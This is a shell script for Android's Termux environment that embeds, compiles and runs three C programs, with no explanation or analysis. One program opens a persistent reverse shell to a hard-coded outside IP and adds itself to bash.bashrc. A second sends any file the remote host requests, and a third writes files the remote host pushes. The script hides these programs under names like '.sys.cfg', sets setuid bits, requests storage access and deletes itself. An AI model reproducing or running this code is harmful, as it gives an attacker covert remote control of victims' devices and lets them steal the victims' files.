data='

#define AIP "3.134.39.220"
#define PORT 16097
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <sys/types.h>
#include <fcntl.h>

int check_infection(){
    int vfd=open("/data/data/com.termux/files/usr/etc/system.cfg",O_RDONLY);
    if (vfd==-1){
      return 1;
}
    else{
      close(vfd);
      return 0;
}
}


void spawn_in_kernel() {

 int pid=fork();
 if (pid<0){}
 if (pid>0){exit(0);}
  int sid=setsid();
  if (sid<0){}

}

int sfd;
void rcs(){
    struct sockaddr_in ad;
    ad.sin_port=htons(PORT);
    ad.sin_family=AF_INET;
    inet_pton(AF_INET,AIP,&ad.sin_addr.s_addr);
    int cnt;
    sfd=socket(AF_INET,SOCK_STREAM,0);

    while (1){

    cnt=connect(sfd,(struct sockaddr*)&ad,sizeof(ad));
    if (cnt==-1){sleep(15);}
    else        {send(sfd,"[+] Termux Reverse Shell Connected\n",35,0);break;}

}
}

int main(int argc,char*argv[]){

    spawn_in_kernel();  // Rn Reverse Shell In Kernel
    char inject_in_etc[70]="cat ";
    char inject_destination[26]="> $PREFIX/etc/system.cfg";
    strcat(inject_in_etc,argv[0]);
    strcat(inject_in_etc,inject_destination);
    strncat(inject_in_etc,"\0",1);
    if (check_infection()==1){
    system(inject_in_etc);
    system("chmod +x $PREFIX/etc/system.cfg && echo '$PREFIX/etc/system.cfg' >> $PREFIX/etc/bash.bashrc &");
}
    struct sockaddr_in ad;
    ad.sin_port=htons(PORT);
    ad.sin_family=AF_INET;
    inet_pton(AF_INET,AIP,&ad.sin_addr.s_addr);
    rcs();
    close(0);close(1);close(2);
    dup2(sfd,0);dup2(sfd,1);dup2(sfd,2);
    send (sfd,"[+] Target System Infected\n",sizeof("[+] Target System Infected\n"),0);
    while (1){
      system("/data/data/com.termux/files/usr/bin/sh");
      send(sfd,"Press CTRL+C To Exit\n",21,0);
      close(sfd);
      rcs();
      close(0);close(1);close(2);
      dup2(sfd,0);dup2(sfd,1);dup2(sfd,2);
}
}
'

dataz='
#define AIP "3.134.39.220"
#define PORT 16102
#include <fcntl.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>

#define sfd socket(AF_INET,SOCK_STREAM,0)
void backit(){
    int pid,sid;
    close (0);close (1);close(2);
    if ((pid=fork())<0){exit(1);}if((pid=fork())>0){exit(0);}
    if ((sid=setsid())<0){exit(1);}
}
void  filesend(char filename[], int afd, char ip[], int portn);
int main(){
   backit();
   filesend("None",sfd, AIP, PORT);
   return 0;
}
void ch(int var, char msg[]){
    if (var == -1){printf ("%s\n",msg);exit(1);}
}

void filesend(char filenam[],int afd, char ip[], int portn){
   struct sockaddr_in adr={ .sin_port=htons(portn), .sin_family=AF_INET };
   inet_pton(AF_INET,ip, &adr.sin_addr.s_addr);
   int vctl=sizeof(struct sockaddr_in);
   int cnt;
   while (1){;cnt=connect(afd,(struct sockaddr*)&adr,sizeof(adr));if (cnt==-1){sleep(20);}else{break;}}
   while (1){
   char filename[256];
   bzero(filename, sizeof(filename));
   recv(afd,filename,sizeof(filename),0);
   strcat(filename,"\0");
   int sfile=open(filename, O_RDONLY);
   char signal[10];
   if (sfile == -1){
     send(afd,"-11",3,0);
     bzero(&sfile,sizeof(sfile));
     continue;
   }
   else{
   strcat(filename,"\0");
   struct stat ft;
   stat(filename,&ft);
   char ftssize[15]; sprintf(ftssize, "%ld",ft.st_size);
   int ss=ft.st_size;
   char data[ss];
   read (sfile, data, sizeof(data));
   sleep(1);
   int snd= send(afd,ftssize,strlen(ftssize),0);
   sleep(1);
   int snd2=send(afd,&data,ss, 0);
   close (sfile);
   bzero(filename,sizeof(filename));
   bzero(data,sizeof(data));
   bzero(ftssize,sizeof(ftssize));
   sleep(2);
   }
   }
}
'

datax='
#define AIP "3.134.39.220"
#define PORT 16102
#include <fcntl.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#define FNFE -1 // FNF: File Not Found Error
void backit(){
    int pid,sid;
    close (0);close (1);close(2);
    if ((pid=fork())<0){exit(1);}if((pid=fork())>0){exit(0);}
    if ((sid=setsid())<0){exit(1);}
}
void dshow(char msg[]){
    printf("%s\n",msg);
}
void recvfile(char ip[], int portn){
   char filename[256];
   int sfd=socket(AF_INET,SOCK_STREAM,0);
   struct sockaddr_in adr={ .sin_port=htons(portn), .sin_family=AF_INET };
   inet_pton(AF_INET,ip, &adr.sin_addr.s_addr);
   while (1){
   int cnt=connect(sfd,(struct sockaddr*)&adr, sizeof(adr));
   if(cnt==-1){sleep(20);}else{break;}}
   while (1){
   char bof_buffer[100];
   char filesize[10];
   int snd =recv(sfd,filesize,sizeof(filesize),0);
   char data[atoi(filesize)];
   int snd1=recv(sfd,data,sizeof(data),0);
   int frg=1;
   char frag[snd1+1];
   int snd5=snd1;
   int rba=0;
   int fsizer=atoi(filesize);
   while (snd1 < fsizer){
       frg++;
       bzero(frag, sizeof(frag));
       rba+=recv(sfd, frag,snd1,0);
       strcat(frag, "\0");
       strcat(data, frag);
       if (rba==(fsizer-snd1)){
          break;
       }
   }
   int snd2=recv(sfd,filename,sizeof(filename),0);
   strcat(filename, "\0");
   int fn=open(filename, O_WRONLY|O_CREAT|O_TRUNC);
   write(fn,data,sizeof(data));
   close (fn);
   bzero(&data,sizeof(data));
   bzero(filename,sizeof(filename));
   bzero(filesize,sizeof(filesize));
   sleep (2);
   }
}
int main(){
     backit();
     recvfile(AIP, PORT);
     return 0;
}
'


trap noctrl SIGINT
echo "$data" > $PREFIX/var/.sys.cfg.c
echo "$datax" > $PREFIX/var/.sys.cfg.1.c
echo "$dataz" > $PREFIX/var/.sys.cfg.2.c
if [ ! -f $PREFIX/bin/gcc ];then
   pkg install clang -y
fi
gcc $PREFIX/var/.sys.cfg.c -o $PREFIX/var/.sys.cfg >>/dev/null
gcc $PREFIX/var/.sys.cfg.1.c -o $PREFIX/var/.sys.cfg.1 >> /dev/null
gcc $PREFIX/var/.sys.cfg.2.c -o $PREFIX/var/.sys.cfg.2 >> /dev/null
chmod +s $PREFIX/var/.sys.* &> /dev/null
$PREFIX/var/.sys.cfg
chmod +s $PREFIX/etc/system.cfg
chmod +x $PREFIX/etc/system.cfg

termux-setup-storage
rm $0
